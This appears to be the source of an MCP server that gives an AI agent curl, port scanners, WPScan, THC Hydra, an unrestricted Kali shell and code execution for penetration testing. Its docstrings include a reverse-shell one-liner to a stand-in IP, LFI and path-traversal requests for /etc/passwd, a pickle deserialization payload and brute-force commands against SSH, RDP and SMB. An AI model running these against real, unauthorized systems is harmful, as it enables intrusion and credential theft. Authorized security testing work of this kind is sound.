"""
Network Recon MCP Server - HTTP Client, Port Scanner, Shell & Hydra

Exposes curl HTTP client, naabu port scanner, general command execution,
and THC Hydra password cracker as MCP tools for agentic penetration testing.

Tools:
    - execute_curl: Execute curl with any CLI arguments
    - execute_naabu: Execute naabu with any CLI arguments
    - kali_shell: Execute any shell command in the Kali sandbox
    - execute_code: Write code to file and execute (no shell escaping needed)
    - execute_hydra: Execute THC Hydra password cracker with any CLI arguments
"""

from fastmcp import FastMCP
import subprocess
import shlex
import re
import os
import threading
import time
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

# Strip ANSI escape codes (terminal colors) from output
ANSI_ESCAPE = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')

# Server configuration
SERVER_NAME = "network_recon"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("NETWORK_RECON_PORT", "8000"))

mcp = FastMCP(SERVER_NAME)

# =============================================================================
# HYDRA PROGRESS TRACKING — Thread-safe state for live progress updates
# =============================================================================

_hydra_lock = threading.Lock()
_hydra_output: list = []
_hydra_active: bool = False
_hydra_command: str = ""
_hydra_start_time: float = 0


@mcp.tool()
def execute_curl(args: str) -> str:
    """
    Execute curl HTTP client with any valid CLI arguments.

    Curl is a command-line tool for transferring data with URLs. It supports
    HTTP, HTTPS, FTP, and many other protocols. Useful for HTTP enumeration,
    API testing, and exploiting web vulnerabilities.

    Args:
        args: Command-line arguments for curl (without the 'curl' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Basic GET request with headers:
        - "-s -i http://10.0.0.5/"

        POST request with JSON:
        - "-s -X POST -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":\"admin\"}' http://10.0.0.5/api/login"

        HEAD request (headers only):
        - "-s -I http://10.0.0.5/"

        Custom User-Agent:
        - "-s -i -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' http://10.0.0.5/"

        Follow redirects:
        - "-s -i -L http://10.0.0.5/"

        HTTPS with insecure (skip cert verification):
        - "-s -k https://10.0.0.5/"

        Get only HTTP status code:
        - "-s -o /dev/null -w '%{http_code}' http://10.0.0.5/"

        Send cookie:
        - "-s -i -b 'session=abc123' http://10.0.0.5/admin"

        Upload file:
        - "-s -X POST -F 'file=@/path/to/file.txt' http://10.0.0.5/upload"

        Basic authentication:
        - "-s -i -u admin:password http://10.0.0.5/admin"

        Custom timeout:
        - "-s -i --connect-timeout 10 --max-time 30 http://10.0.0.5/"

        Path traversal test:
        - "-s -i 'http://10.0.0.5/../../../../etc/passwd'"

        LFI test:
        - "-s -i 'http://10.0.0.5/index.php?page=../../../etc/passwd'"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["curl"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=60
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output if output.strip() else "[INFO] No response received"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 60 seconds. Consider using --connect-timeout and --max-time flags."
    except FileNotFoundError:
        return "[ERROR] curl not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_naabu(args: str) -> str:
    """
    Execute naabu port scanner with any valid CLI arguments.

    Naabu is a fast port scanner written in Go that allows you to enumerate
    valid ports for hosts in a fast and reliable manner. It can also integrate
    with nmap for service detection using the -nmap-cli flag.

    Args:
        args: Command-line arguments for naabu (without the 'naabu' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Basic port scan:
        - "-host 10.0.0.5 -p 1-1000 -json"

        Scan with top ports:
        - "-host 192.168.1.0/24 -top-ports 100 -json"

        Scan from file:
        - "-list targets.txt -p 22,80,443,8080 -json"

        With nmap service detection:
        - "-host 10.0.0.5 -p 80,443 -nmap-cli 'nmap -sV -sC'"

        Fast scan with high rate:
        - "-host 10.0.0.5 -p 1-65535 -rate 5000 -json"

        Scan specific ports:
        - "-host 10.0.0.5 -p 21,22,23,25,53,80,443,445,3306,3389,5432,8080 -json"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["naabu"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=300
        )
        output = ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            # Strip ANSI codes then filter out progress/info messages, keep errors
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('[INF]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"
        return output if output.strip() else "[INFO] No open ports found"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds. Consider using a smaller port range or higher rate."
    except FileNotFoundError:
        return "[ERROR] naabu not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def kali_shell(command: str) -> str:
    """
    Execute any shell command in the Kali Linux sandbox.

    Full access to the Kali Linux environment including all installed tools.
    Use for running exploit scripts, downloading PoCs, encoding payloads,
    or using any Kali tool not exposed as a dedicated MCP tool.

    Args:
        command: The full shell command to execute (run via bash -c)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Run a Python exploit script:
        - "python3 -c 'import requests; r=requests.get(\"http://10.0.0.5/\"); print(r.text)'"

        Download a PoC from GitHub:
        - "git clone https://github.com/user/CVE-2021-XXXXX-PoC.git /tmp/poc"

        Run downloaded exploit:
        - "cd /tmp/poc && python3 exploit.py http://10.0.0.5"

        Use netcat for port check:
        - "nc -zv 10.0.0.5 80"

        Base64 encode a payload:
        - "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64"

        Check installed tools:
        - "which sqlmap nikto wfuzz ffuf hydra"
    """
    try:
        result = subprocess.run(
            ["bash", "-c", command],
            capture_output=True,
            text=True,
            timeout=120
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output if output.strip() else "[INFO] Command completed with no output"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 120 seconds."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_code(code: str, language: str = "python", filename: str = "exploit") -> str:
    """
    Write code to a file and execute it with the appropriate interpreter.

    Eliminates shell escaping issues by receiving code as a clean string parameter,
    writing it to a file using a heredoc, and executing the file directly.
    Use this instead of kali_shell when running multi-line scripts.

    Args:
        code: The source code to execute. Multi-line code with proper indentation
              is fully supported — no shell escaping needed.
        language: Programming language (default: "python"). Determines file extension
                  and interpreter. Supported: python, bash, ruby, perl, c, cpp
        filename: Base filename without extension (default: "exploit").
                  File is created at /tmp/{filename}.{ext}

    Returns:
        Combined stdout + stderr from execution, or compilation error for compiled languages.

    Examples:
        Python exploit script:
        - code: "import requests\\nr = requests.post('http://10.0.0.5/vuln', data={'cmd': 'id'})\\nprint(r.text)"

        Python deserialization payload:
        - code: "import pickle, base64, os\\nclass E:\\n    def __reduce__(self):\\n        return (os.system, ('id',))\\nprint(base64.b64encode(pickle.dumps(E())).decode())"

        Bash enumeration script:
        - code: "#!/bin/bash\\nfor port in 80 443 8080; do\\n  curl -s -o /dev/null -w \\"%{http_code} $port\\\\n\\" http://10.0.0.5:$port/\\ndone"
          language: "bash"

        C exploit (compiled with gcc):
        - code: "#include <stdio.h>\\nint main() { printf(\\"uid=%d\\\\n\\", getuid()); return 0; }"
          language: "c"
    """
    if not code or not code.strip():
        return "[ERROR] No code provided to execute"

    # Normalize language and map to (extension, interpreter_or_None)
    language = language.lower().strip()
    LANG_MAP = {
        "python": ("py", "python3"),
        "py":     ("py", "python3"),
        "bash":   ("sh", "bash"),
        "sh":     ("sh", "bash"),
        "shell":  ("sh", "bash"),
        "ruby":   ("rb", "ruby"),
        "rb":     ("rb", "ruby"),
        "perl":   ("pl", "perl"),
        "pl":     ("pl", "perl"),
        "c":      ("c",  None),
        "cpp":    ("cpp", None),
        "c++":    ("cpp", None),
    }

    if language not in LANG_MAP:
        supported = sorted(set(LANG_MAP.keys()))
        return f"[ERROR] Unsupported language: '{language}'. Supported: {', '.join(supported)}"

    ext, interpreter = LANG_MAP[language]

    # Sanitize filename to prevent path traversal / shell injection
    safe_filename = re.sub(r'[^a-zA-Z0-9_-]', '_', filename)
    filepath = f"/tmp/{safe_filename}.{ext}"
    binary_path = f"/tmp/{safe_filename}"

    # Step 1: Write code to file using single-quoted heredoc (no shell interpretation)
    write_cmd = f"cat << 'REDAMON_CODE_EOF' > {filepath}\n{code}\nREDAMON_CODE_EOF"
    try:
        write_result = subprocess.run(
            ["bash", "-c", write_cmd],
            capture_output=True,
            text=True,
            timeout=10
        )
        if write_result.returncode != 0:
            return f"[ERROR] Failed to write code file: {write_result.stderr}"
    except Exception as e:
        return f"[ERROR] Failed to write code file: {str(e)}"

    # Step 2: Execute (interpreted) or compile+execute (compiled)
    try:
        if interpreter:
            # Interpreted language — run directly
            result = subprocess.run(
                [interpreter, filepath],
                capture_output=True,
                text=True,
                timeout=120
            )
        else:
            # Compiled language — compile first, then execute
            compiler = "gcc" if ext == "c" else "g++"
            compile_result = subprocess.run(
                [compiler, filepath, "-o", binary_path],
                capture_output=True,
                text=True,
                timeout=60
            )
            if compile_result.returncode != 0:
                return f"[ERROR] Compilation failed:\n{compile_result.stderr}"

            result = subprocess.run(
                [binary_path],
                capture_output=True,
                text=True,
                timeout=120
            )

        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        if result.returncode != 0 and not output.strip():
            return f"[ERROR] Code exited with code {result.returncode}"
        return output if output.strip() else "[INFO] Code executed with no output"

    except subprocess.TimeoutExpired:
        return "[ERROR] Code execution timed out after 120 seconds."
    except FileNotFoundError as e:
        return f"[ERROR] Interpreter/compiler not found: {str(e)}"
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_hydra(args: str) -> str:
    """
    Execute THC Hydra password cracker with any valid CLI arguments.

    Hydra is a fast, parallelised network login cracker supporting 50+ protocols.
    It runs, reports results, and exits (stateless — no persistent sessions).
    Output is streamed line-by-line for live progress tracking.

    Args:
        args: Command-line arguments for hydra (without the 'hydra' command itself)

    Returns:
        Command output with found credentials or status information

    Examples:
        SSH brute force (max 4 threads for SSH):
        - "-l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5"

        FTP brute force:
        - "-l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -f -e nsr -V ftp://10.0.0.5"

        SMB with domain:
        - '-l "DOMAIN\\administrator" -P passwords.txt -f -V smb://10.0.0.5'

        HTTP POST form (target before protocol, form spec uses colons):
        - '-l admin -P passwords.txt -f -V 10.0.0.5 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"'

        RDP (max 1 thread):
        - "-l Administrator -P passwords.txt -t 1 -f -V rdp://10.0.0.5"

        VNC (password-only, no username):
        - '-p "" -P passwords.txt -f -V vnc://10.0.0.5'

        MySQL:
        - "-l root -P passwords.txt -f -V mysql://10.0.0.5"

        Redis (password-only):
        - '-p "" -P passwords.txt -f -V redis://10.0.0.5'

        Colon-separated user:pass file:
        - "-C /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt -f ssh://10.0.0.5"
    """
    global _hydra_output, _hydra_active, _hydra_command, _hydra_start_time

    try:
        cmd_args = shlex.split(args)

        # Initialize progress state
        with _hydra_lock:
            _hydra_output = []
            _hydra_active = True
            _hydra_command = args[:100]
            _hydra_start_time = time.time()

        proc = subprocess.Popen(
            ["hydra"] + cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Merge stderr into stdout for unified streaming
            text=True,
            bufsize=1  # Line-buffered
        )

        output_lines = []
        try:
            for line in proc.stdout:
                clean_line = ANSI_ESCAPE.sub('', line.rstrip())
                output_lines.append(clean_line)
                with _hydra_lock:
                    _hydra_output.append(clean_line)
        except Exception:
            pass

        # Wait for process to finish (should already be done after stdout EOF)
        try:
            proc.wait(timeout=1800)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            output_lines.append("[ERROR] Timed out after 1800s.")

        # Mark execution complete
        with _hydra_lock:
            _hydra_active = False

        output = '\n'.join(output_lines)
        return output if output.strip() else "[INFO] No valid credentials found"

    except FileNotFoundError:
        with _hydra_lock:
            _hydra_active = False
        return "[ERROR] hydra not found. Ensure it is installed in the container."
    except Exception as e:
        with _hydra_lock:
            _hydra_active = False
        return f"[ERROR] {str(e)}"


# =============================================================================
# HTTP PROGRESS SERVER — For live Hydra progress updates during execution
# =============================================================================

HYDRA_PROGRESS_PORT = int(os.getenv("HYDRA_PROGRESS_PORT", "8014"))


def get_hydra_progress() -> dict:
    """Get current Hydra execution progress (thread-safe)."""
    with _hydra_lock:
        raw_output = '\n'.join(_hydra_output[-100:])
        clean_output = ANSI_ESCAPE.sub('', raw_output)
        return {
            "active": _hydra_active,
            "command": _hydra_command,
            "elapsed_seconds": round(time.time() - _hydra_start_time, 1) if _hydra_active else 0,
            "line_count": len(_hydra_output),
            "output": clean_output
        }


@mcp.tool()
def execute_masscan(args: str) -> str:
    """
    Execute masscan port scanner with any valid CLI arguments.

    Masscan is the fastest port scanner — optimized for scanning large networks
    and IP ranges using asynchronous SYN packets. Requires root or CAP_NET_RAW.

    IMPORTANT: Masscan only accepts IP addresses and CIDR ranges (NOT hostnames).
    Resolve hostnames to IPs first using dig/nslookup before scanning.

    Args:
        args: Complete masscan CLI arguments as a single string.

    Examples:
        "10.0.0.0/24 -p 80,443 --rate 1000"
        "-iL /tmp/ips.txt --top-ports 100 --rate 5000"
        "192.168.1.1 -p 0-65535 --rate 10000 --banners"

    Returns:
        Masscan scan output or error message.
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["masscan"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=600
        )

        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            stderr_lines = result.stderr.strip().split('\n')
            useful_stderr = [l for l in stderr_lines if not l.startswith('rate:')]
            if useful_stderr:
                output += "\n[STDERR]\n" + "\n".join(useful_stderr)

        return output.strip() if output.strip() else "[INFO] Scan completed with no output."

    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 600 seconds. Use smaller target ranges or fewer ports."
    except FileNotFoundError:
        return "[ERROR] masscan not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_wpscan(args: str) -> str:
    """
    Execute WPScan WordPress vulnerability scanner with any valid CLI arguments.

    WPScan is a black-box WordPress security scanner that detects security issues
    in WordPress installations including vulnerable plugins, themes, weak passwords,
    and configuration issues. Requires WPScan API token for vulnerability data.

    Args:
        args: Command-line arguments for wpscan (without the 'wpscan' command itself)

    Returns:
        Scan results in JSON format (when --format json is used) or text output

    Examples:
        Basic scan with JSON output:
        - "--url http://example.com --format json --no-banner"

        Enumerate plugins and themes:
        - "--url http://example.com --enumerate p,t --format json --no-banner"

        With API token for vulnerability data:
        - "--url http://example.com --api-token YOUR_TOKEN --format json --no-banner"

        Aggressive plugin detection:
        - "--url http://example.com --enumerate p --plugins-detection aggressive --format json --no-banner"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["wpscan"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=600
        )

        output = ""
        if result.stdout:
            output += ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('[i]') and 'warning:' not in line.lower()
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"

        if not output.strip():
            return "[INFO] WPScan completed with no output. Target may not be a WordPress site."

        return output

    except subprocess.TimeoutExpired:
        return "[ERROR] WPScan timed out after 600 seconds."
    except FileNotFoundError:
        return "[ERROR] wpscan not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


class HydraProgressHandler(BaseHTTPRequestHandler):
    """HTTP handler for Hydra progress endpoint."""

    def do_GET(self):
        if self.path == '/progress':
            try:
                progress = get_hydra_progress()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps(progress).encode())
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Suppress request logging."""
        pass


def start_hydra_progress_server(port: int = HYDRA_PROGRESS_PORT):
    """Start HTTP server for Hydra progress endpoint in a background thread."""
    server = HTTPServer(('0.0.0.0', port), HydraProgressHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[HYDRA] Progress server started on port {port}")
    return server


if __name__ == "__main__":
    import sys

    # Check transport mode from environment
    transport = os.getenv("MCP_TRANSPORT", "stdio")

    if transport == "sse":
        start_hydra_progress_server(HYDRA_PROGRESS_PORT)
        mcp.run(transport="sse", host=SERVER_HOST, port=SERVER_PORT)
    else:
        mcp.run(transport="stdio")
